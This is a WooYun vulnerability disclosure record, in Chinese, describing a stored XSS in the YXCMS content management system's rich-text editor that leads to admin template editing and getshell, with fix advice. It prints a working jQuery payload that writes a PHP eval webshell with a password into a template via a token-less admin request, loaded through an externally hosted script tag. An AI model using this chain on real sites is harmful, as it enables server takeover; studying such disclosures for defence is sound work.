{"id": 59339, "wybug_id": "wooyun-2014-047805", "wybug_title": "YXcmsApp某处xss导致getshell", "wybug_corp": "YXCMS", "wybug_author": "phith0n", "wybug_date": "2014-01-05 17:04", "wybug_open_date": "2014-04-05 17:05", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-04-05：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： xss到后台导致getshell一条龙服务~不过略鸡肋。 详细说明：  YXCMS是一款面向企业的内容管理系统，采用三级缓存，MVC架构以BSD协议开源。注册了用户以后来到用户管理页面，点击信息发布 - 增加咨询，发现是一个富文本编辑器，kindeditor。不管是什么编辑器，既然给了一个用户这么大的权限，这种情况下很容易出现xss。随便输入点什么东西，抓包，修改content字段内容，写你的xss代码，什么都行。\n\n好了。管理员在后台就能看到我提交的文章：\n\n然后编辑的话就能触发xss：\n\n再利用后台的代码编辑功能我就能直接getshell了，先构造一个javascript，因为这个站是用Jquery写的前端，所以我们的xss代码也能直接用Jquery完成：\n$(document).ready(function(){\tvar code = \"<?php eval($_POST[f4ckkk]); ?><?php return array ( 'name' => '最新默认模板2013-2-1', 'author' => 'yx',); ?> \";\t$.post(\"/tmp/index.php?r=admin/set/tpedit&Mname=default&fname=info.php\", {\t\t\"code\": code\t},function(data){});});\n一个简单的post提交，因为没有验证token，所以也算一个CSRF。将以上代码保存为http://xxxxx/xx.js，然后作为xss代码就行了：</textarea><script src=”http://xxxx/xx.js”></script>执行以后就会修改模板，加入我们的一句话。地址就是：/protected/apps/default/view/default/info.php 密码：f4ckkk\n\n我们来到这个文件，可以看到我刚才post过去的内容已经完完整整地躺在那里了：\n\n   漏洞证明：  见详细说明。   修复方案：  原因是在接收用户发送来的内容时只对注入进行了防御：\nif (get_magic_quotes_gpc()) {\t\t\t\t$data['content'] = stripslashes($_POST['content']);\t\t\t} else {\t\t\t\t$data['content'] = $_POST['content'];\t\t\t}\n这种富文本的问题处理方式：1.过滤危险的标签，但因为使用黑名单的方式所以很难完全防御2.过滤<>'\"&等，但又与其富文本的本质相违背3.最终解决方案：使用ubb，相对来说最安全了。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}